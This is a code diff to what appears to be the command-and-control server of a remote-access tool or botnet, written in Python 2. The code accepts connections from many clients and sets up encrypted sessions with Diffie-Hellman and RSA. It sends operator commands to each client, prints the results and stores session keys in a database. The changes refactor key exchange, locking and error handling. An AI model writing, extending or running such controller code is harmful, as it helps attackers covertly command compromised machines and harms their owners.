@@ -133,6 +133,7 @@ class Server(threading.Thread):
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('localhost', port)) if globals().get('DEBUG') else self.s.bind(('0.0.0.0', port))
         self.s.listen(100)
+        self.shell.set()
 
     def _prompt(self, data):
         return raw_input(self._prompt_color + self._prompt_style + '\n' + data + self._text_color + self._text_style)
@@ -278,17 +279,19 @@ class Server(threading.Thread):
             return output
         except Exception as e:
             return self._error(str(e))
-    
+
+
+    # Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631 
     def _session_key(self):
         try:
-            g  = 2
-            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-            a  = bytes_to_long(os.urandom(32))
-            xA = pow(g, a, p)
-            xB = requests.post(self.database['domain'] + self.database['pages']['session'], data={'public_key': hex(xA).strip('L'), 'id': '0000000000000000000000000000000000000000000000000000000000000000'}).content
-            xB = long(xB)
-            x  = pow(xB, a, p)
-            return self._obfuscate(SHA256.new(bytes(x).strip('L')).hexdigest())
+            # RFC 3526 MOPD group 14 (2048 bit strong prime)
+            p   = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
+            g   = 2            
+            a   = bytes_to_long(os.urandom(32))            
+            Ax  = pow(g, a, p)  # g ^ A mod P 
+            Bx  = long(requests.post(self.database['domain'] + self.database['pages']['session'], data={'public_key': hex(Ax).strip('L'), 'id': '0000000000000000000000000000000000000000000000000000000000000000'}).content)
+            k   = pow(Bx, a, p) # Bx ^ A mod P 
+            return self._obfuscate(SHA256.new(bytes(k).strip('L')).hexdigest())
         except Exception as e:
             return self._error("{} returned error: {}".format(self._session_key.func_name, str(e)))
 
@@ -347,20 +350,22 @@ class Server(threading.Thread):
             while '\n' not in buf:
                 try:
                     buf += client.connection.recv(65536)
-                except: break
+                except (socket.timeout, socket.error):
+                    break
             if buf and len(bytes(buf)):
                 try:
                     data = self.decrypt(buf, client.name)
                     try:
                         return json.loads(data)
                     except:
-                        return data
+                        return {'task': 'None', 'client': client.info['id'], 'session': client.session, 'command': 'error', 'result': str(data)}
                 except:
-                    return buf
+                    return {'task': 'None', 'client': client.info['id'], 'session': client.session, 'command': 'error', 'result': str(buf)}
             else:
+                client.shell.clear()
                 self.remove_client(client.name)
                 self.shell.set()
-                self._return()
+                self.run()
         except Exception as e:
             self._error("{} returned error: {}".format(self.recv_client.func_name, str(e)))
 
@@ -670,16 +675,15 @@ class Server(threading.Thread):
             print("{} error: {}".format(self.get_current_session.func_name, str(e)))
 
     def connection_handler(self):
-        while True:
-            connection, addr    = self.s.accept()
-            private             = RSA.generate(2048)
-            public              = private.publickey()
-            client              = ClientHandler(connection, address=addr, name=self.count, private_key=private, public_key=public)
-            self.clients[self.count]  = client
-            self.count  += 1
-            sys.stdout.write('\n')
-            client.start()
-            self.run() if not self.current_client else self.current_client.run()
+        connection, addr    = self.s.accept()
+        private             = RSA.generate(2048)
+        public              = private.publickey()
+        client              = ClientHandler(connection, address=addr, name=self.count, private_key=private, public_key=public)
+        self.clients[self.count]  = client
+        self.count  += 1
+        sys.stdout.write('\n')
+        client.start()
+        self.run() if not self.current_client else self.current_client.run()
             
     def run(self):
         _ = threads.pop('connection_handler', None)
@@ -713,13 +717,6 @@ class Server(threading.Thread):
         print('Server shutting down')
         sys.exit()
 
-    def start(self):
-        threads[self.connection_handler.func_name] = threading.Thread(target=self.connection_handler, name=time.time())
-        threads[self.run.func_name] = threading.Thread(target=self.run, name=time.time())
-        threads[self.connection_handler.func_name].start()
-        threads[self.run.func_name].start()
-        self.shell.set()
-
 
 class ClientHandler(threading.Thread):
 
@@ -742,7 +739,8 @@ class ClientHandler(threading.Thread):
 
             
     def _prompt(self, data):
-        return raw_input(threads['server']._prompt_color + threads['server']._prompt_style + '\n' + bytes(data).rstrip())
+        with self.lock:
+            return raw_input(threads['server']._prompt_color + threads['server']._prompt_style + '\n' + bytes(data).rstrip())
              
     def _error(self, data):
         with self.lock:
@@ -750,9 +748,9 @@ class ClientHandler(threading.Thread):
 
     def _kill(self):
         self.shell.clear()
-        threads['server'].shell.set()
         threads['server'].remove_client(self.name)
         threads['server'].current_client = None
+        threads['server'].shell.set()
         threads['server'].run()
 
     def _info(self):
@@ -783,7 +781,8 @@ class ClientHandler(threading.Thread):
         try:
             query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
             session_id  = requests.post(Server.database['domain'] + Server.database['pages']['session'], data={'id': self.info['id']}).content.strip().rstrip()
-            print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
+            with self.lock:
+                print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
             ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
             self.connection.sendall(ciphertext + '\n')
             ciphertext  = ""
@@ -799,17 +798,18 @@ class ClientHandler(threading.Thread):
             self._error("{} returned error: {}".format(self._session.func_name, str(e)))
             self._kill()
 
+    # Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631
     def _session_key(self):
         try:
-            g  = 2
+            #RFC 3526 MOPD group 14 (2048 bit strong prime)
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
             a  = bytes_to_long(os.urandom(32))
-            xA = pow(g, a, p)
-            self.connection.send(long_to_bytes(xA))
-            xB = bytes_to_long(self.connection.recv(256))
-            x  = pow(xB, a, p)
-            y  = SHA256.new(long_to_bytes(x)).hexdigest()
-            return threads['server']._obfuscate(y)
+            g  = 2
+            Ax = pow(g, a, p)  # Ax = g ^ A mod P
+            self.connection.send(long_to_bytes(Ax))
+            Bx = bytes_to_long(self.connection.recv(256))
+            k  = pow(Bx, a, p) # k = Bx ^ A mod P
+            return threads['server']._obfuscate(SHA256.new(long_to_bytes(k)).hexdigest())
         except Exception as e:
             self._error("{} returned error: {}".format(self._session_key, str(e)))
             self._kill()
@@ -817,9 +817,13 @@ class ClientHandler(threading.Thread):
     def run(self):
         while True:
             try:
-                task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
+                if self.prompt:
+                    task = self.prompt
+                else:
+                    threads['server'].send_client('prompt')
+                    task = threads['server'].recv_client(self.name)
                 self.shell.wait()
-                if task:
+                if isinstance(task, dict):
                     if 'prompt' in task.get('command'):
                         self.prompt     = task
                         command         = self._prompt(bytes(self.prompt.get('result')).format(self.name))
@@ -831,9 +835,11 @@ class ClientHandler(threading.Thread):
                                 self.shell.clear()
                                 threads['server'].save_task_results(task)
                                 self.shell.set()
-                            continue
                         else:
                             threads['server'].send_client(command, self.name)
+                            result = threads['server'].recv_client(self.name)
+                            if result:
+                                threads['server']._print(result)
                     elif 'help' in task.get('command'):
                         self.shell.clear()
                         threads['server'].show_usage_help(data=task.get('result'))
@@ -841,10 +847,14 @@ class ClientHandler(threading.Thread):
                     elif 'standby' in task.get('command'):
                         threads['server']._print(task.get('result'))
                         break
+                    elif 'error' in task.get('command'):
+                        self._error(task.get('result'))
                     else:
                         if task.get('result'):
                             threads['server']._print(task.get('result'))
                             threads['server'].save_task_results(task)
+                else:
+                    threads['server']._print(str(task))
                 self.prompt = None
                 if threads['server'].exit_status:
                     break
